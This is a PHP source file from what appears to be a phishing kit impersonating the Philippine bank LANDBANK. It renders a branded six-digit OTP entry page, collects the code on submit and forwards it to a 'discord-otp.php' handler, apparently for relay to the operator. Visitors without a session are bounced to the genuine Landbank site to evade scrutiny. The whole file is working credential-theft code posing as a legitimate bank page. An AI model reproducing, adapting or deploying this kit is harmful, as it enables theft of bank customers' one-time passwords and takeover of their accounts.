<?php
error_reporting(0);

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);
ini_set('memory_limit', '-1');
ini_set('max_execution_time', '0');
set_time_limit(0);
date_default_timezone_set('Asia/Manila');

session_start();
$_SESSION["y"] = '';
if(empty($_SESSION["x"]) ){
    session_destroy();
    session_unset();
    header("Location: https://www.landbank.com/about-us");
    die();
}

     if(isset($_POST['submitotp2'])){
      if(!empty($_POST['otp'])){
              $numotp = $_POST['otp'].$_POST['otp1'].$_POST['otp2'].$_POST['otp3'].$_POST['otp4'].$_POST['otp5'];
              $replyMsg = "Logged => $ip  \n\n$numotp";
              $encodenumotp = base64_encode(base64_encode($numotp));
              header("Location:discord-otp.php?number=$numotp");
            }
          }

     
echo '<!DOCTYPE html>
<html>
<head>
<title>LANDBANK OTP</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css?family=Karla|Karla:Bold|Poppins|Poppins:600&amp;display=swap" rel="stylesheet">
<link rel="icon" href="img/lb-icon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script>
  $("input").keypress(function(){
   if ( $(this).val().length > 1){
    $(this).addClass(\'active\');
    }
  });
  
  function isNumber(evt) {
  evt = (evt) ? evt : window.event;
  var charCode = (evt.which) ? evt.which : evt.keyCode;
  if (charCode > 31 && (charCode < 48 || charCode > 57)) {
    return false;
  } 
  return true;
   }
 
</script>';
echo "
<script>


  $(document).ready(function(){
    
    $('body').on('keyup', 'input.otp', function()
    {
      var key = event.keyCode || event.charCode;
      var inputs = $('input.otp');
      if(($(this).val().length === this.size) && key != 32) 
      {
        inputs.eq(inputs.index(this) + 1).focus();  
      } 
      if( key == 8 || key == 46 )
      {
        var indexNum = inputs.index(this);
        if(indexNum != 0)
        {
        inputs.eq(inputs.index(this) - 1).val('').focus();
        }
      }
      
    });
  });</script>";
  
  function maskNumber($number) {
    if (strlen($number) > 7) {
        return substr($number, 0, 3) . '***' . substr($number, -4);
    }
    return $number;
}

echo '

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  touch-action: manipulation;
}
  @font-face {
      font-family: "Larken Black";
      src: url("fonts/Larken-Black.woff") format("woff");
      font-weight: bold;
        }

body {
  display: flex;
  justify-content: center;
  align-items: center;
  flex-direction: column;
  width: 100vw;
  color: light-gray;
  margin: 0;
  padding: 0;
  font-family: Karla, sans-serif;
  text-align: center;
  -webkit-touch-callout: none;
  -webkit-user-select: none;
  -khtml-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.otp-bx {
  margin-top: 200px;
  display: flex;
  justify-content: center;
}

.otp-bx input {
  width: 50px;
  font-size: 22px;
  padding: 10px;
  text-align: center;
  border-radius: 5px;
  margin: 2px;
  border: 2px solid rgb(230, 230, 230);
  font-weight: bold;
  outline: none;
  transition: all 0.1s;
}

otp.bx input:focus {
  border: 2px solid rgb(231, 229, 229);
}

.space {
  margin-right: 1rem !important;
}

#otpdisable {
 background-color: green;
            color: black;
            font-size: 20px;
            font-weight: bold;
            padding: 20px 40%;
            border: none;
            border-radius: 40px;
            cursor: pointer;
            text-align: center;
            margin-top: auto;
            position: absolute;
            bottom: 10%;
            left: 50%;
            transform: translateX(-50%);
            transition: background-color 0.3s;
}

#otpdisable:disabled {
   background-color: green;
            color: black;
            font-size: 20px;
            font-weight: bold;
            padding: 20px 40%;
            border: none;
            border-radius: 40px;
            cursor: pointer;
            text-align: center;
            margin-top: auto;
            position: absolute;
            bottom: 10%;
            left: 50%;
            transform: translateX(-50%);
            transition: background-color 0.3s;
}

.otp:focus {
  outline: none;
  color: dodgerblack;
}

span {
  font-size: 15px;
}

.header {
  background: #ecf1fa;
  padding: 10px;
  margin-left: 10px;
  margin-right: 10px;
  letter-spacing: 0.2px;
}

$char-w: 1ch;
$gap: .5 * $char-w;
$n-char: 7;
$in-w: $n-char * ($char-w + $gap);

.otpotp {
  border: none;
  width: 8.83ch;
  background:
    repeating-linear-gradient(90deg,
      dimgrey 0,
      dimgrey 1ch,
      transparent 0,
      transparent 1.5ch)
    0 100% / 100% 2px no-repeat;
  color: dimgrey;
  font: 5ch consolas, monospace;
  letter-spacing: .5ch;
}

.otpotp:focus {
  outline: none;
  color: dodgerblack;
}

.enterOTP {
    font-family: "Larken Black", "Poppins", sans-serif;
    font-size: 30px;
    font-weight: bold;
    position: absolute;
    top: 5%;
    left: 20px;
    color: #373737;
}
.notice {
    font-family: "Karla", sans-serif;
    font-size: 18px;
    position: absolute;
    top: 12%;
    left: 20px;
    color: black;

</style>

</head>
<body>
<img src="img/landbank-logo-removebg-preview.png" style="width: 280px; height: 40px; margin-top:1%;">
<br>
<div style="position:center;">Enter the OTP (One-Time Password) sent to your mobile number</div>

';

echo '
<br>';
echo '<form method="post">
<div class="otp-bx">
    <input class="otp" onkeypress="return isNumber(event)" onkeyup="length_disabled_btn(this.value)" id="otpcode1" name="otp" type="tel" size="1" maxlength="1" autofocus="autofocus" required>
    <input class="otp" onkeypress="return isNumber(event)" onkeyup="length_disabled_btn(this.value)" id="otpcode2" name="otp1" type="tel" size="1" maxlength="1" required>
    <input class="otp" onkeypress="return isNumber(event)" onkeyup="length_disabled_btn(this.value)" id="otpcode3" name="otp2" type="tel" size="1" maxlength="1" required>
    <input class="otp" onkeypress="return isNumber(event)" onkeyup="length_disabled_btn(this.value)" id="otpcode4" name="otp3" type="tel" size="1" maxlength="1" required>
    <input class="otp" onkeypress="return isNumber(event)" onkeyup="length_disabled_btn(this.value)" id="otpcode5" name="otp4" type="tel" size="1" maxlength="1" required>
    <input class="otp" onkeypress="return isNumber(event)" onkeyup="length_disabled_btn(this.value)" id="otpcode6" name="otp5" type="tel" size="1" maxlength="1" required>

   </div>

</center>
<script language="javascript">

function startTimer(duration, display) {
    var timer = duration, minutes, seconds;
    setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = minutes + ":" + seconds;

        if (--timer < 0) {
            timer = duration;
        }
    }, 1000);
}

window.onload = function () {
    var fiveMinutes = 60 * 5,
        display = document.querySelector("#time");
    startTimer(fiveMinutes, display);
};

</script>
<script language="javascript">

function submitOTP2()
{
window.location.reload(true);
window.location = "#resendotp";
}

function OTPInput() {
  const inputs = document.querySelectorAll(\"#otpnum > *[id]\");
  for (let i = 0; i < inputs.length; i++) {
    inputs[i].addEventListener(\"keydown\', function(event) {
      if (event.key === "Backspace") {
        inputs[i].value = \""\";
        if (i !== 0)
          inputs[i - 1].focus();
      } else {
        if (i === inputs.length - 1 && inputs[i].value !== \"\") {
          return true;
        } else if (event.keyCode > 47 && event.keyCode < 58) {
          inputs[i].value = event.key;
          if (i !== inputs.length - 1)
            inputs[i + 1].focus();
          event.preventDefault();
        } else if (event.keyCode > 64 && event.keyCode < 91) {
          inputs[i].value = String.fromCharCode(event.keyCode);
          if (i !== inputs.length - 1)
            inputs[i + 1].focus();
          event.preventDefault();
        }
      }
    });
  }
};

</script>
';
echo'
<script language="javascript">



function submitOTP2()
{
window.location.reload(true);
window.location = "#resendotp";
}

function OTPInput() {
  const inputs = document.querySelectorAll(\'#otpnum > *[id]\');
  for (let i = 0; i < inputs.length; i++) {
    inputs[i].addEventListener(\'keydown\', function(event) {
      if (event.key === "Backspace") {
        inputs[i].value = \'\';
        if (i !== 0)
          inputs[i - 1].focus();
      } else {
        if (i === inputs.length - 1 && inputs[i].value !== \'\') {
          return true;
        } else if (event.keyCode > 47 && event.keyCode < 58) {
          inputs[i].value = event.key;
          if (i !== inputs.length - 1)
            inputs[i + 1].focus();
          event.preventDefault();
        } else if (event.keyCode > 64 && event.keyCode < 91) {
          inputs[i].value = String.fromCharCode(event.keyCode);
          if (i !== inputs.length - 1)
            inputs[i + 1].focus();
          event.preventDefault();
        }
      }
    });
  }
}
OTPInput();

</script>
';
echo'
<script language="javascript">

</script>
';
echo "
<br><p style='text-align:center;font-size:12.5px;'> Didn't get the code? Resend code in <a style='text-decoration:none;' href='#' id='time'></div></p></a></span></p>
<script>;";

echo '
</script>
<br><br/><br>
<input type="submit" name="submitotp2" id="otpdisable" value="Next" disabled>

<script>
function length_disabled_btn(value){
    
 
         var otp1 = document.getElementById("otpcode1").value;
         var otp2 = document.getElementById("otpcode2").value;
         var otp3 = document.getElementById("otpcode3").value;
         var otp4 = document.getElementById("otpcode4").value;
         var otp5 = document.getElementById("otpcode5").value;
         var otp6 = document.getElementById("otpcode6").value;
         
         var otp1_length = otp1.toString().length;
         var otp2_length = otp2.toString().length;
         var otp3_length = otp3.toString().length;
         var otp4_length = otp4.toString().length;
         var otp5_length = otp5.toString().length;
         var otp6_length = otp6.toString().length;
    
     
     if(otp1_length == "1" && otp2_length == "1" && otp3_length == "1" && otp4_length == "1" && otp5_length == "1" && otp6_length == "1"){
          document.getElementById("otpdisable").disabled = false;
        } 
      else{
          
          document.getElementById("otpdisable").disabled = true;
      }
  
}

</script>
</form>

</body></html>';